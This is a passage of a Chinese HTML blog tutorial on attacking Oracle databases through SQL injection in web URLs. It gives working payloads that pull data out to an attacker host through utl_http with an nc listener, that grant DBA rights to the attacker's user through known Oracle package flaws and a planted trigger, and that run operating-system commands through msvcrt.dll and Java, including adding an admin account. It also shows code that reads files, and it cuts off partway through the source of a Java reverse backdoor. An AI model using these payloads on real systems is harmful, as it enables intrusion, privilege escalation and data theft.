rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;oracle独有的获取信息的方法吧：&lt;/span&gt;&lt;/div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`utl_http.request`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;&lt;span style=&quot;font-size: 10.5pt;&quot;&gt;local: nc.traditional -l -p 1234&lt;/span&gt;&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and 1=utl_http.request(&apos;http://10.1.100.1/&apos;||(SQL in HERE))&amp;nbsp;&amp;nbsp; utl_inaddr.get_host_name`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`error base&amp;nbsp;&amp;nbsp; web: http://www.hellove.net/hellove.php?id=123 and 1=utl_inaddr.get_host_name((SQL in HERE))&amp;nbsp;&amp;nbsp; utl_inaddr.get_host_address`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;` error base or dns&amp;nbsp;&amp;nbsp; web: http://www.hellove.net/hellove.php?id=123 and 1=utl_inaddr.get_host_address((SQL in HERE))&amp;nbsp;&amp;nbsp; ctxsys.drithsx.sn`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;` error base&amp;nbsp;&amp;nbsp; web: http://www.hellove.net/hellove.php?id=123 and 1=ctxsys.drithsx.sn(1,(SQL in HERE))&amp;nbsp;&amp;nbsp; sys.dbms_ldap.init`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`dns&amp;nbsp;&amp;nbsp; web: http://www.hellove.net/hellove.php?id=123 and SYS.DBMS_LDAP.INIT(((SQL in HERE)||&apos;hellove.net&apos;,80) is not null `&lt;/pre&gt; utl_http.request, utl_inaddr.get_host_name, utl_inaddr.get_host_address 由于11g的安全特性无法继续使用，但是我们 可以在**显错模式**下利用ctxsys.drithsx.sn， 或者自己搭建一个dnsserver，将一个域名的解析server指向该server， 利用sys.dbms_ldap.init 还可以在11g下正常工作 &lt;div style=&quot;color:gray&quot;&gt; &lt;/div&gt;&lt;small&gt;&lt;small&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 14pt;&quot;&gt;**&amp;nbsp;权限提升：**&lt;/span&gt;&lt;/small&gt;&lt;/small&gt;&lt;div&gt;&lt;span style=&quot;font-size: 19px; line-height: 27px;&quot;&gt;**&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;​&lt;/span&gt;**&lt;/span&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;get_domain_index_metadata，&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;get_v2_domain_index_tables，&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;1\. get_domain_index_tables（&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;10g r2未打补丁的情况下，还存在着&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;）&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;三个函数在06年7月之后就被修复了，也就是说 oracle 11g就不能再用了&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt; &lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt; &lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;INDX&apos;,&apos;SCH&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);execute immediate &apos;&apos;declare pragma autonomous_transaction; begin execute immediate &apos;&apos;&apos;&apos;grant dba to hellove&apos;&apos;&apos;&apos;; end;&apos;&apos;; END;--&apos;,&apos;SYS&apos;,1,&apos;1&apos;,0)=0;`&lt;/pre&gt;&lt;div&gt; &lt;/div&gt;&lt;div&gt;&lt;span style=&quot;color: rgb(153, 153, 153); font-family: Optima, Georgia, STSong, serif; line-height: 24px; background-color: rgb(248, 248, 248);&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;2.因为** dbms_xmlquery.newcontext**与**dbms_xmlquery.getxml**&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;仅能在pl/sql环境下利用的 漏洞，在web下也能利用了&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`dbms_xmlquery.getxml() public role&amp;nbsp;&amp;nbsp; dbms_xmlquery.newcontext() public role&amp;nbsp;&amp;nbsp; sys.kupp$proc.create_mater_process() dba role`&lt;/pre&gt;&lt;/div&gt; &lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; font-size: 10.5pt;&quot;&gt;只要有create session就可以了，只可惜DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS不能在web环境中直接调用，作者给的poc能使我们的用户直接得到Java权限&lt;/span&gt;&lt;/div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`DECLARE&amp;nbsp;&amp;nbsp; POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;&amp;nbsp;&amp;nbsp; CURSOR C1 IS SELECT &apos;GRANT&apos;,USER(), &apos;SYS&apos;,&apos;java.io.FilePermission&apos;,&apos;&amp;lt;&amp;lt;ALL FILES&amp;gt;&amp;gt;&apos;,&apos;execute&apos;,&apos;ENABLED&apos; from dual;&amp;nbsp;&amp;nbsp; BEGIN&amp;nbsp;&amp;nbsp; OPEN C1;&amp;nbsp;&amp;nbsp; FETCH C1 BULK COLLECT INTO POL;&amp;nbsp;&amp;nbsp; CLOSE C1;&amp;nbsp;&amp;nbsp; DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);&amp;nbsp;&amp;nbsp; END;&amp;nbsp;&amp;nbsp;`&lt;/pre&gt;&lt;div&gt; &lt;/div&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;create procedure权限才能利用：（&lt;/span&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;11g就没有测试成功&lt;/span&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;）&lt;/span&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &apos;&apos;create or replace function myjava return number is PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &apos;&apos;&apos;&apos;DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;GRANT&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,USER(), &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&amp;amp;lt;&amp;amp;lt;ALL FILES&amp;amp;gt;&amp;amp;gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;ENABLED&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos; from dual;BEGIN OPEN C1; FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;&apos;&apos;&apos;&apos;;commit;return 1;end;&apos;&apos;; commit; end;&apos;) is not null web: http://www.hellove.net/hellove.php?id=123 and myjava()=1`&lt;/pre&gt; &lt;div style=&quot;color:gray&quot;&gt; 需要有create procedure的权限 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp; begin execute immediate &apos;&apos;create or replace function get_dba return varchar2 authid current_user is PRAGMA&amp;nbsp;&amp;nbsp; autonomous_transaction;BEGIN execute immediate &apos;&apos;&apos;&apos;grant dba to hellove&apos;&apos;&apos;&apos;;commit;return &apos;&apos;&apos;&apos;z&apos;&apos;&apos;&apos;;END; &apos;&apos;; commit; end;&apos;)&amp;nbsp;&amp;nbsp; from dual) is not null web :http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA&amp;nbsp;&amp;nbsp; AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(&apos;&apos;A.A&apos;&apos;&apos;&apos;||hellove.get_dba)--&apos;&apos;,&apos;&apos;BBBB&apos;&apos;);commit;end;&apos;) from dual) is not&amp;nbsp;&amp;nbsp; null`&lt;/pre&gt;&lt;div&gt; &lt;/div&gt;&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;/div&gt;&lt;small&gt;&lt;small&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;&amp;nbsp;利用MDsys权限 的trigger在system权限下执行命令&lt;/span&gt;&lt;/small&gt;&lt;/small&gt;&lt;/div&gt;&lt;div&gt;&lt;font size=&quot;3&quot;&gt;&lt;span style=&quot;line-height: 24px;&quot;&gt; &lt;/span&gt;&lt;/font&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace procedure g(v varchar2) authid current_user is&amp;nbsp;&amp;nbsp; PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp; stmt varchar2(400) := &apos;create or replace trigger &apos;&amp;nbsp;&amp;nbsp; || &apos;system.evil_trigger &apos;&amp;nbsp;&amp;nbsp; || &apos;before insert on &apos;&amp;nbsp;&amp;nbsp; || &apos;system.OL$ &apos;&amp;nbsp;&amp;nbsp; || &apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;&apos;&amp;nbsp;&amp;nbsp; || &apos;BEGIN execute immediate &apos;&apos;grant dba to hellove&apos;&apos;;END evil_trigger;&apos;;&amp;nbsp;&amp;nbsp; begin&amp;nbsp;&amp;nbsp; execute immediate stmt;&amp;nbsp;&amp;nbsp; commit;&amp;nbsp;&amp;nbsp; end; `&lt;/pre&gt; &lt;div&gt; 我们先创建一个过程g（名字要短）,方便注射到MDSYS.SDO_DROP_USER_BEFORE中，然后将g的执行权限赋给public，在过程g中，我们创建 一个在system模式OL$的trigger，代码如上 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`drop user &quot;g&apos;);hellove.g(&apos;&quot;;&amp;nbsp;&amp;nbsp; insert into system.OL$(OL_NAME) values(&apos;test&apos;);&amp;nbsp;&amp;nbsp; set role dba `&lt;/pre&gt; 删除用户将触发触发器MDSYS.sdo_drop_user_before，注入代码以MDSYS模式下执行，而MDSYS可以create any trigger，所以我们利用MDSYS 创建system.OL$下的一个trigger，之所以是system.OL$，是因为public用户可以往里面插入数据而触发触发器，然后由于触发器是以definer来 运行的，所以创建的system.evil_trigger就以sysem的权限下加用户了,以上代码还是可以结合dbms_xmlquery.getxml来使用，请自行构造 &lt;div&gt; &lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 16pt;&quot;&gt;**执行命令：**&lt;/span&gt;&lt;/div&gt;&lt;small&gt;&lt;small&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;&amp;nbsp;1.&amp;nbsp;&lt;/span&gt;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;font-size: 10.5pt; color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;oracle 10gr2&lt;/span&gt;&lt;/span&gt;&lt;font size=&quot;1&quot;&gt;&lt;span style=&quot;line-height: 14px;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt;以前&lt;/span&gt;&lt;/span&gt;&lt;/font&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;&amp;nbsp;2\. $ORACLE_HOME\bin\下压根就没msvcrt.dll，&quot;c:\windows\system32\msvcrt.dll&quot;或者&quot;……\windows\system32\msvcrt.dll”来执行command的&lt;/span&gt;&lt;font size=&quot;1&quot;&gt;&lt;span style=&quot;line-height: 14px;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot; style=&quot;font-size: 12pt;&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/font&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;font size=&quot;1&quot;&gt;&lt;span style=&quot;line-height: 14px;&quot;&gt; &lt;/span&gt;&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace library exec_shell as &apos;$ORACLE_HOME\bin\msvcrt.dll&apos;;&amp;nbsp;&amp;nbsp; create or replace procedure execmd (command in char) is external name &quot;system&quot; library exec_shell language c;&amp;nbsp;&amp;nbsp; / exec execmd(&apos;net user &amp;gt; hellove.txt&apos;);`&lt;/pre&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;font-size: 12px; line-height: 17px;&quot;&gt;可以复制mdvcrt.dll 到指定目录使用上面语句。&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;font-size: 12px; line-height: 17px;&quot;&gt; &lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;span style=&quot;font-size: 12px; line-height: 17px;&quot;&gt;利用java执行cmd&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;color:gray&quot;&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace and resolve java source named JAVACMD as&amp;nbsp;&amp;nbsp; import java.lang.&amp;#42;&amp;nbsp;&amp;nbsp; import java.io.&amp;#42;&amp;nbsp;&amp;nbsp; public class JAVACMD&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; public static void execmd(String command) throws IOException&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; Runtime.getRuntime().exec(command);&amp;nbsp;&amp;nbsp; }&amp;nbsp;&amp;nbsp; } create or replace procedure MYJAVACMD(command in varchar) as language java&amp;nbsp;&amp;nbsp; name &apos;JAVACMD.execmd(java.lang.String)&apos;;`&lt;/pre&gt; &lt;div&gt; 不过在执行这个MYJAVACMD之前必须将相应的JAVA权限赋予用户，之前提到的DBMS_JVM_EXP_PERMS就可以给用户赋予任意java权限，简单起见，我们直接赋予 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`exec dbms_java.grant_permission( &apos;HELLOVE&apos;, &apos;SYS:java.io.FilePermission&apos;, &apos;&amp;lt;&amp;lt;ALL FILES&amp;gt;&amp;gt;&apos;, &apos;execute&apos; );&amp;nbsp;&amp;nbsp; exec MYJAVACMD(&apos;net user&apos;);`&lt;/pre&gt; &lt;div&gt; dbms_xmlquery.newcontext来在web下使用 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp; begin execute immediate &apos;&apos;create or replace and resolve java source named JAVACMD as import java.lang.&amp;#42;import java.io.&amp;#42;public&amp;nbsp;&amp;nbsp; class JAVACMD{public static void execmd(String command) throws IOException{Runtime.getRuntime().exec(command);}} &apos;&apos;; commit;&amp;nbsp;&amp;nbsp; end;&apos;) from dual) is not null web: http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;&amp;nbsp;&amp;nbsp; begin execute immediate &apos;&apos;create or replace procedure MYJAVACMD(command in varchar) as language java name&amp;nbsp;&amp;nbsp; &apos;&apos;&apos;&apos;JAVACMD.execmd(java.lang.String)&apos;&apos;&apos;&apos;; &apos;&apos;; commit;end;&apos;) from dual) is not null web :http://www.hellove.net/hellove.php?id=123 and (select dbms_xmlquery.newcontext(&apos;begin myjavacmd(&apos;&apos;net user admin admin /add&apos;&apos;)&amp;nbsp;&amp;nbsp; ;commit;end;&apos;) from dual) is not null`&lt;/pre&gt;&lt;div&gt; &lt;/div&gt;&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;font-size: 10.5pt; color: rgb(51, 51, 51); font-family: &apos;Microsoft YaHei&apos;, Verdana, Helvetica, Arial, sans-serif; line-height: 24px; background-color: rgb(255, 255, 255);&quot;&gt;利用pl/sql来读取文件：&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace procedure read_file(dirname varchar2,fname varchar2) as&amp;nbsp;&amp;nbsp; FD utl_file.file_type;&amp;nbsp;&amp;nbsp; buffer varchar2(200);&amp;nbsp;&amp;nbsp; begin&amp;nbsp;&amp;nbsp; execute immediate &apos;create or replace directory rw_file as &apos;&apos;&apos;||dirname||&apos;&apos;&apos;&apos;;&amp;nbsp;&amp;nbsp; FD := utl_file.fopen(&apos;RW_FILE&apos;,fname,&apos;r&apos;);&amp;nbsp;&amp;nbsp; dbms_output.enable(100000);&amp;nbsp;&amp;nbsp; loop&amp;nbsp;&amp;nbsp; sys.utl_file.get_line(FD,buffer);&amp;nbsp;&amp;nbsp; dbms_output.put_line(buffer);&amp;nbsp;&amp;nbsp; end loop;&amp;nbsp;&amp;nbsp; execute immediate &apos;drop directory rw_file&apos;; exception&amp;nbsp;&amp;nbsp; when NO_DATA_FOUND then&amp;nbsp;&amp;nbsp; dbms_output.put_line(&apos;---|---|---|file end!---|---|---|---|&apos;);&amp;nbsp;&amp;nbsp; when others then&amp;nbsp;&amp;nbsp; dbms_output.put_line(&apos;please check your file&apos;);&amp;nbsp;&amp;nbsp; end read_file;&amp;nbsp;&amp;nbsp; /&amp;nbsp;&amp;nbsp; exec read_file(&apos;c:\&apos;,&apos;boot.ini&apos;);&amp;nbsp;&amp;nbsp; `&lt;/pre&gt; 上面是PL/SQL代码来读取文件，下面是利用JAVA来读取文件内容 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace and compile java source named javareadfile as&amp;nbsp;&amp;nbsp; import java.lang.&amp;#42;&amp;nbsp;&amp;nbsp; import java.io.&amp;#42;&amp;nbsp;&amp;nbsp; public class javareadfile&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; public static void readfile(String filename) throws IOException&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; FileReader f = new FileReader(filename);&amp;nbsp;&amp;nbsp; BufferedReader fr = new BufferedReader(f);&amp;nbsp;&amp;nbsp; String text = fr.readLine();&amp;nbsp;&amp;nbsp; while(text != null)&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; System.out.println(text);&amp;nbsp;&amp;nbsp; text = fr.readLine();&amp;nbsp;&amp;nbsp; }&amp;nbsp;&amp;nbsp; fr.close();&amp;nbsp;&amp;nbsp; }&amp;nbsp;&amp;nbsp; } create or replace procedure jreadfile (filename in varchar)&amp;nbsp;&amp;nbsp; as language java&amp;nbsp;&amp;nbsp; name &apos;javareadfile.readfile(java.lang.String)&apos;; exec jreadfile(&apos;c:\boot.ini&apos;); `&lt;/pre&gt; 我们还是可以利用之前的那个DBMS_JVM_EXP_PERMS获取java.io.FilePermission，可以简单读取文件 &lt;div&gt; &lt;/div&gt;**&amp;nbsp;访问网络**&lt;/div&gt; 在PL/SQL中我们可以利用oracle自带的那几个包(utl_tcp,utl_http…etc)来访问网络，自我感觉不怎么好用，比较喜欢用java， 下面我们来实现一个简易的java版本反向后门 &lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`create or replace and compile java source named javasocket as&amp;nbsp;&amp;nbsp; import java.net.&amp;#42;&amp;nbsp;&amp;nbsp; import java.io.&amp;#42;&amp;nbsp;&amp;nbsp; import java.lang.&amp;#42; public class javasocket&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; public static void test(String addr,String str_port)&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp; Socket socket;&amp;nbsp;&amp;nbsp; String len;&amp;nbsp;&amp;nbsp; String s;&amp;nbsp;&amp;nbsp; InputStream Is;&amp;nbsp;&amp;nbsp; 